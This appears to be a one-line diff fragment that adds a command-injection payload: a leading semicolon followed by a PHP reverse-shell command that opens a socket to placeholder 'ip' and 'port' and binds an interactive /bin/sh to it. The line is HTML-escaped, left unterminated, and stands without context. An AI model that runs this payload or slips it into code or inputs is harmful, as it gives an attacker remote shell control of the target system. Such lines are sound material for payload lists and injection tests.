@@ -1,0 +1,1 @@
+;php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");
